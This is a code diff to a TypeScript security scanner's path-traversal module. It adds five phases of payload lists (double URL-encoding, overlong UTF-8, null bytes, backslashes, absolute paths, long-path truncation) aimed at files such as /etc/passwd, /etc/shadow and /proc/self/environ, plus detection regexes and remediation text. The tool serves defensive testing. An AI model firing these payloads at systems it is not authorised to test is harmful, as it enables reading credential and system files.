@@ -230,5 +230,289 @@ export const pathTraversalModule: ScanModule = async (target) => {
 
   await Promise.allSettled(traversalTests);
 
+  // --- Phase 3: URL-encoded traversal (double-encode & overlong UTF-8) ---
+  const urlEncodedPayloads = [
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini",
+    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd",
+    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows/win.ini",
+    "..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%af..%c0%ae%c0%afetc/passwd",
+    "%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%afetc/passwd",
+    "..%25c0%25ae..%25c0%25ae..%25c0%25afetc/passwd",
+  ];
+
+  const urlEncodedTests: Promise<void>[] = [];
+  for (const t of deduped.slice(0, 15)) {
+    const pathname = new URL(t.url).pathname;
+    const key = `${pathname}:${t.paramName}`;
+    if (flagged.has(key)) continue;
+
+    urlEncodedTests.push(
+      (async () => {
+        const results = await Promise.allSettled(
+          urlEncodedPayloads.map(async (payload) => {
+            const url = new URL(t.url);
+            url.searchParams.set(t.paramName, payload);
+            const res = await scanFetch(url.href, { timeoutMs: 5000 });
+            return { payload, text: await res.text() };
+          }),
+        );
+        for (const r of results) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, text } = r.value;
+          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
+            flagged.add(key);
+            findings.push({
+              id: `path-traversal-url-encoded-${count++}`,
+              module: "path-traversal",
+              severity: "critical",
+              title: `URL-encoded path traversal bypass on ${pathname} (param: ${t.paramName})`,
+              description:
+                "Double URL-encoded or overlong UTF-8 encoded traversal sequences bypassed input filters. The server decoded the path multiple times or accepted malformed UTF-8, allowing directory traversal to read arbitrary files.",
+              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
+              remediation:
+                "Canonicalize all input by fully decoding URL-encoded values in a loop until stable before validating. Reject overlong UTF-8 sequences. Validate the resolved path stays within the allowed directory after all normalization.",
+              cwe: "CWE-22",
+              owasp: "A01:2021",
+            });
+            break;
+          }
+        }
+      })(),
+    );
+  }
+  await Promise.allSettled(urlEncodedTests);
+
+  // --- Phase 4: Null byte injection ---
+  const nullBytePayloads = [
+    "../../../etc/passwd%00.jpg",
+    "../../../etc/passwd%00.png",
+    "../../../etc/passwd%00.gif",
+    "../../../etc/passwd%00.txt",
+    "../../../etc/passwd%00.html",
+    "../../../etc/shadow%00.css",
+    "..\\..\\..\\windows\\win.ini%00.jpg",
+    "../../../etc/passwd%2500.jpg",
+    "../../../etc/passwd%00%00.jpg",
+    "../../../etc/passwd\x00.bmp",
+  ];
+
+  const nullByteTests: Promise<void>[] = [];
+  for (const t of deduped.slice(0, 15)) {
+    const pathname = new URL(t.url).pathname;
+    const key = `${pathname}:${t.paramName}`;
+    if (flagged.has(key)) continue;
+
+    nullByteTests.push(
+      (async () => {
+        const results = await Promise.allSettled(
+          nullBytePayloads.map(async (payload) => {
+            const url = new URL(t.url);
+            url.searchParams.set(t.paramName, payload);
+            const res = await scanFetch(url.href, { timeoutMs: 5000 });
+            return { payload, text: await res.text() };
+          }),
+        );
+        for (const r of results) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, text } = r.value;
+          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
+            flagged.add(key);
+            findings.push({
+              id: `path-traversal-null-byte-${count++}`,
+              module: "path-traversal",
+              severity: "critical",
+              title: `Null byte path traversal on ${pathname} (param: ${t.paramName})`,
+              description:
+                "A null byte (%00) injected into the file path truncated the filename before the extension check, allowing the server to return the contents of an arbitrary system file. This indicates the backend is vulnerable to null byte injection in file path handling.",
+              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
+              remediation:
+                "Strip all null bytes (\\x00, %00) from user input before using it in file paths. Upgrade to a language runtime that rejects null bytes in path operations. Validate the resolved path stays within the allowed directory.",
+              cwe: "CWE-158",
+              owasp: "A01:2021",
+            });
+            break;
+          }
+        }
+      })(),
+    );
+  }
+  await Promise.allSettled(nullByteTests);
+
+  // --- Phase 5: Dot-dot-backslash (Windows) variants ---
+  const windowsBackslashPayloads = [
+    "..\\..\\..\\etc\\passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+    "..\\..\\..\\..\\..\\..\\etc\\passwd",
+    "..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
+    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+    "..%255c..%255c..%255cwindows%255cwin.ini",
+    "..%255c..%255c..%255cetc%255cpasswd",
+    "..%5c..%2f..%5c..%2fetc/passwd",
+    "..\\../..\\../..\\../etc/passwd",
+  ];
+
+  const windowsTests: Promise<void>[] = [];
+  for (const t of deduped.slice(0, 15)) {
+    const pathname = new URL(t.url).pathname;
+    const key = `${pathname}:${t.paramName}`;
+    if (flagged.has(key)) continue;
+
+    windowsTests.push(
+      (async () => {
+        const results = await Promise.allSettled(
+          windowsBackslashPayloads.map(async (payload) => {
+            const url = new URL(t.url);
+            url.searchParams.set(t.paramName, payload);
+            const res = await scanFetch(url.href, { timeoutMs: 5000 });
+            return { payload, text: await res.text() };
+          }),
+        );
+        for (const r of results) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, text } = r.value;
+          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
+            flagged.add(key);
+            findings.push({
+              id: `path-traversal-windows-backslash-${count++}`,
+              module: "path-traversal",
+              severity: "critical",
+              title: `Windows backslash path traversal on ${pathname} (param: ${t.paramName})`,
+              description:
+                "Backslash-based directory traversal (..\\\\) returned sensitive file contents. The server accepts Windows-style path separators or fails to normalize backslashes before path resolution, allowing attackers to escape the intended directory.",
+              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
+              remediation:
+                "Normalize all path separators by replacing backslashes with forward slashes before validation. Use path.resolve() and verify the resolved path stays within the intended directory. Consider rejecting requests containing backslashes in file path parameters.",
+              cwe: "CWE-22",
+              owasp: "A01:2021",
+            });
+            break;
+          }
+        }
+      })(),
+    );
+  }
+  await Promise.allSettled(windowsTests);
+
+  // --- Phase 6: Absolute path injection ---
+  const absolutePathPayloads = [
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/hosts",
+    "/proc/self/environ",
+    "/proc/version",
+    "/proc/self/cmdline",
+    "C:\\Windows\\win.ini",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "C:\\boot.ini",
+    "\\\\localhost\\c$\\windows\\win.ini",
+    "//etc/passwd",
+    "file:///etc/passwd",
+  ];
+
+  const absolutePathIndicators = [
+    ...TRAVERSAL_INDICATORS,
+    /localhost|127\.0\.0\.1/,          // /etc/hosts
+    /PROCESSOR|SystemRoot|COMPUTERNAME/i, // /proc/self/environ or Windows env
+    /Linux version/,                    // /proc/version
+  ];
+
+  const absolutePathTests: Promise<void>[] = [];
+  for (const t of deduped.slice(0, 15)) {
+    const pathname = new URL(t.url).pathname;
+    const key = `${pathname}:${t.paramName}`;
+    if (flagged.has(key)) continue;
+
+    absolutePathTests.push(
+      (async () => {
+        const results = await Promise.allSettled(
+          absolutePathPayloads.map(async (payload) => {
+            const url = new URL(t.url);
+            url.searchParams.set(t.paramName, payload);
+            const res = await scanFetch(url.href, { timeoutMs: 5000 });
+            return { payload, text: await res.text() };
+          }),
+        );
+        for (const r of results) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, text } = r.value;
+          if (absolutePathIndicators.some((p) => p.test(text))) {
+            flagged.add(key);
+            findings.push({
+              id: `path-traversal-absolute-${count++}`,
+              module: "path-traversal",
+              severity: "critical",
+              title: `Absolute path injection on ${pathname} (param: ${t.paramName})`,
+              description:
+                "An absolute file path supplied in a parameter returned sensitive system file contents. The server uses user input directly in file operations without restricting to a base directory, allowing unrestricted file read access.",
+              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
+              remediation:
+                "Never allow absolute paths in user input. Strip leading slashes and drive letters. Use path.resolve() relative to a safe base directory and verify the result starts with that base directory before serving the file.",
+              cwe: "CWE-36",
+              owasp: "A01:2021",
+            });
+            break;
+          }
+        }
+      })(),
+    );
+  }
+  await Promise.allSettled(absolutePathTests);
+
+  // --- Phase 7: Path truncation (long path) ---
+  const longPadding = "A".repeat(4000);
+  const truncationPayloads = [
+    `../../../etc/passwd/${longPadding}`,
+    `../../../etc/passwd/.${longPadding}`,
+    `../../../etc/passwd${longPadding}`,
+    `../${longPadding}/../../../../etc/passwd`,
+    `../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.`,
+    `${"../".repeat(200)}etc/passwd`,
+    `${"..\\".repeat(200)}windows\\win.ini`,
+  ];
+
+  const truncationTests: Promise<void>[] = [];
+  for (const t of deduped.slice(0, 10)) {
+    const pathname = new URL(t.url).pathname;
+    const key = `${pathname}:${t.paramName}`;
+    if (flagged.has(key)) continue;
+
+    truncationTests.push(
+      (async () => {
+        const results = await Promise.allSettled(
+          truncationPayloads.map(async (payload) => {
+            const url = new URL(t.url);
+            url.searchParams.set(t.paramName, payload);
+            const res = await scanFetch(url.href, { timeoutMs: 8000 });
+            return { payload: payload.substring(0, 80) + "...", text: await res.text() };
+          }),
+        );
+        for (const r of results) {
+          if (r.status !== "fulfilled" || flagged.has(key)) continue;
+          const { payload, text } = r.value;
+          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
+            flagged.add(key);
+            findings.push({
+              id: `path-traversal-truncation-${count++}`,
+              module: "path-traversal",
+              severity: "high",
+              title: `Path truncation traversal on ${pathname} (param: ${t.paramName})`,
+              description:
+                "An extremely long file path was truncated by the server to a valid traversal path, returning sensitive file contents. This indicates the backend truncates paths at a fixed buffer size before resolving them, which can be exploited to bypass path validation.",
+              evidence: `Payload (truncated): ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
+              remediation:
+                "Enforce a strict maximum length on file path parameters before any processing. Reject requests with excessively long path values. Validate the resolved path stays within the intended directory after all normalization.",
+              cwe: "CWE-22",
+              owasp: "A01:2021",
+            });
+            break;
+          }
+        }
+      })(),
+    );
+  }
+  await Promise.allSettled(truncationTests);
+
   return findings;
 };
